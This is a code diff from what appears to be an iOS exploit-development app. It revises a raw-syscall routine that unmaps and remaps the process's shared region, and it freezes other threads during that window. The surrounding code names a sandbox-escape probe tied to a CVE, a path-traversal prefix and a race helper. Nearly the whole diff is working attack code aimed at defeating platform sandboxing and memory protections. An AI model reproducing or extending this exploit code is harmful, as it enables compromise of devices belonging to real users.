@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v239)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v240)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v239: unmap SR via raw SVC(294,0) + remap(536) as first-mapper ===\n"];
+        [self appendLog:@"\n=== Rie v240: fixed SVC macro + thread suspend + remap(536) as first-mapper ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9714,78 +9714,130 @@ static uint64_t rie_find_exec_base(task_t task,
         [self appendLog:@"\n── Phase D-5: unmap SR (294,0) + remap (536) raw SVC ──"];
         [self appendLog:@"  !! HIGH RISK: process may crash if remap fails !!"];
         {
-            // Raw SVC wrapper — compiled into our binary, survives SR unmap.
-            // XNU arm64: carry clear = success (x0=retval), carry set = error (x0=-1, x1=errno)
-            // Use %= for unique local labels across multiple macro invocations.
+            // Fixed SVC macro: explicit mov into x0-x5,x16 guarantees correct
+            // registers regardless of compiler choices. v239 used "+r" with
+            // register asm hints which Clang doesn't always honor.
             #define RIE_RAW_SVC(nr, a0,a1,a2,a3,a4,a5) ({ \
-                register long _x16 asm("x16") = (nr); \
-                register long _x0 asm("x0") = (long)(a0); \
-                register long _x1 asm("x1") = (long)(a1); \
-                register long _x2 asm("x2") = (long)(a2); \
-                register long _x3 asm("x3") = (long)(a3); \
-                register long _x4 asm("x4") = (long)(a4); \
-                register long _x5 asm("x5") = (long)(a5); \
-                asm volatile( \
+                long _rie_ret; \
+                __asm__ volatile( \
+                    "mov x16, %[nr]\n\t" \
+                    "mov x0, %[a0]\n\t" \
+                    "mov x1, %[a1]\n\t" \
+                    "mov x2, %[a2]\n\t" \
+                    "mov x3, %[a3]\n\t" \
+                    "mov x4, %[a4]\n\t" \
+                    "mov x5, %[a5]\n\t" \
                     "svc #0x80\n\t" \
-                    : "+r"(_x0), "+r"(_x1), "+r"(_x2), "+r"(_x3), "+r"(_x4), "+r"(_x5) \
-                    : "r"(_x16) \
-                    : "cc", "memory", "x9","x10","x11","x12","x13","x14","x15","x17" \
+                    "mov %[ret], x0\n\t" \
+                    : [ret] "=r"(_rie_ret) \
+                    : [nr] "r"((long)(nr)), \
+                      [a0] "r"((long)(a0)), \
+                      [a1] "r"((long)(a1)), \
+                      [a2] "r"((long)(a2)), \
+                      [a3] "r"((long)(a3)), \
+                      [a4] "r"((long)(a4)), \
+                      [a5] "r"((long)(a5)) \
+                    : "x0","x1","x2","x3","x4","x5","x16","cc","memory" \
                 ); \
-                /* On XNU arm64, Unix syscalls: x0=0 on success, x0>0=errno on error */ \
-                (long)_x0; \
+                _rie_ret; \
             })
 
-            // Pre-allocate source page and prepare structs BEFORE unmapping
-            uint8_t *src = NULL;
-            vm_size_t srcSz = 0x4000;
-            vm_allocate(mach_task_self(), (vm_address_t*)&src, srcSz, VM_FLAGS_ANYWHERE);
-
-            struct rie_sr_file tf5;
-            struct rie_sr_mapping tm5;
-            memset(&tf5, 0, sizeof(tf5)); memset(&tm5, 0, sizeof(tm5));
-            tf5.sf_fd = -1; tf5.sf_mappings_count = 1; tf5.sf_slide = 0;
-
-            if (src) {
-                memset(src, 0x41, srcSz);
-                tm5.sms_address = 0x180100000ULL;
-                tm5.sms_size = 0x4000;
-                tm5.sms_max_prot = 5; tm5.sms_init_prot = 3;
-                tm5.sms_file_offset = (uint64_t)(uintptr_t)src;
-                tm5.sms_slide_size = 0; tm5.sms_slide_start = 0;
-            }
-
+            // -- Pre-verification: test raw SVC with safe syscall 294 --
+            // Compare raw SVC vs libsystem sc() to confirm macro works
+            // before we risk the dangerous unmap.
+            [self appendLog:@"  pre-verify: testing raw SVC macro..."];
+            uint64_t raw_addr = 0, sc_addr = 0;
+            long raw_ret = RIE_RAW_SVC(294, (long)&raw_addr, 0,0,0,0,0);
+            long sc_ret = sc(294, &sc_addr);
             [self appendLog:[NSString stringWithFormat:
-                @"  ready: src=%p", src]];
+                @"  raw SVC(294,&addr): ret=%ld addr=0x%llx | sc(294,&addr): ret=%ld addr=0x%llx",
+                raw_ret, (unsigned long long)raw_addr,
+                sc_ret, (unsigned long long)sc_addr]];
+            BOOL macroOK = (raw_ret == sc_ret && raw_addr == sc_addr);
 
-            // Step 1: unmap shared region via RIE_RAW_SVC(294, 0)
-            // Kernel: start_address==0 → unmaps SR from our task
-            long r1 = RIE_RAW_SVC(294, 0ULL, 0,0,0,0,0);
-
-            // CRITICAL: after step 1, SR is potentially unmapped!
-            // We must NOT call any ObjC or libc functions between here and step 2.
-
-            // Step 2: remap via RIE_RAW_SVC(536, nf, files_ptr, nm, maps_ptr)
-            long r2 = RIE_RAW_SVC(536, 1, (long)&tf5, 1, (long)&tm5, 0, 0);
-
-            // Now try to log results. If step 2 succeeded, SR is back and
-            // ObjC/logging works again. If not, this log line itself may crash.
-            // Raw SVC returns 0 on success, >0 as errno on error
-            [self appendLog:[NSString stringWithFormat:
-                @"  raw unmap: x0=%ld (0=ok, >0=errno) | raw remap: x0=%ld", r1, r2]];
-
-            if (r1 == 0 && r2 == 0) {
-                [self appendLog:@"  *** FIRST-MAPPER SUCCESS via raw SVC! SR remapped! ***"];
-            } else if (r1 != 0) {
-                [self appendLog:[NSString stringWithFormat:
-                    @"  unmap returned errno=%ld — sc(294,0) did not remove SR", r1]];
+            if (!macroOK) {
+                [self appendLog:@"  !! RAW SVC MISMATCH — macro broken, aborting risky phase !!"];
             } else {
+                [self appendLog:@"  raw SVC macro verified OK"];
+
+                // -- Prepare structs BEFORE unmapping and thread suspend --
+                uint8_t *src = NULL;
+                vm_size_t srcSz = 0x4000;
+                vm_allocate(mach_task_self(), (vm_address_t*)&src, srcSz, VM_FLAGS_ANYWHERE);
+
+                struct rie_sr_file tf5;
+                struct rie_sr_mapping tm5;
+                memset(&tf5, 0, sizeof(tf5)); memset(&tm5, 0, sizeof(tm5));
+                tf5.sf_fd = -1; tf5.sf_mappings_count = 1; tf5.sf_slide = 0;
+
+                if (src) {
+                    memset(src, 0x41, srcSz);
+                    tm5.sms_address = 0x180100000ULL;
+                    tm5.sms_size = 0x4000;
+                    tm5.sms_max_prot = 5; tm5.sms_init_prot = 3;
+                    tm5.sms_file_offset = (uint64_t)(uintptr_t)src;
+                    tm5.sms_slide_size = 0; tm5.sms_slide_start = 0;
+                }
+
+                [self appendLog:[NSString stringWithFormat:@"  ready: src=%p", src]];
+
+                // -- Suspend all other threads --
+                // After SR unmap, any thread calling libsystem will crash
+                // and take down the whole process. Freeze them first.
+                thread_t me = mach_thread_self();
+                thread_act_array_t ths = NULL;
+                mach_msg_type_number_t nth = 0;
+                kern_return_t krt = task_threads(mach_task_self(), &ths, &nth);
                 [self appendLog:[NSString stringWithFormat:
-                    @"  remap returned errno=%ld — unmapped but remap failed", r2]];
+                    @"  threads: %u total, kr=%d", nth, krt]];
+
+                int suspended = 0;
+                if (krt == KERN_SUCCESS && ths && nth > 0) {
+                    for (mach_msg_type_number_t i = 0; i < nth; i++) {
+                        if (ths[i] != me) {
+                            kern_return_t kr_s = thread_suspend(ths[i]);
+                            if (kr_s == KERN_SUCCESS) suspended++;
+                        }
+                    }
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  suspended %d/%u other threads", suspended, nth]];
+                }
+
+                // -- Risky window: unmap SR + remap as first-mapper --
+                // No ObjC/libc calls between these two SVCs!
+                long r1 = RIE_RAW_SVC(294, 0ULL, 0,0,0,0,0);
+                long r2 = RIE_RAW_SVC(536, 1, (long)&tf5, 1, (long)&tm5, 0, 0);
+
+                // -- Resume all suspended threads --
+                if (krt == KERN_SUCCESS && ths && nth > 0) {
+                    for (mach_msg_type_number_t i = 0; i < nth; i++) {
+                        if (ths[i] != me) {
+                            thread_resume(ths[i]);
+                        }
+                    }
+                    vm_deallocate(mach_task_self(), (vm_address_t)ths,
+                        nth * sizeof(thread_t));
+                }
+                if (me) mach_port_deallocate(mach_task_self(), me);
+
+                // Log results. If remap succeeded, ObjC works again.
+                [self appendLog:[NSString stringWithFormat:
+                    @"  raw unmap: x0=%ld (0=ok, >0=errno) | raw remap: x0=%ld", r1, r2]];
+
+                if (r1 == 0 && r2 == 0) {
+                    [self appendLog:@"  *** FIRST-MAPPER SUCCESS via raw SVC! SR remapped! ***"];
+                } else if (r1 != 0) {
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  unmap returned errno=%ld — sc(294,0) did not remove SR", r1]];
+                } else {
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  remap returned errno=%ld — unmapped but remap failed", r2]];
+                }
+
+                if (src) vm_deallocate(mach_task_self(), (vm_address_t)src, srcSz);
             }
 
             #undef RIE_RAW_SVC
-
-            if (src) vm_deallocate(mach_task_self(), (vm_address_t)src, srcSz);
         }
 
         // ── Phase E: Walk SR submap regions, find non-auth slide carrier ──
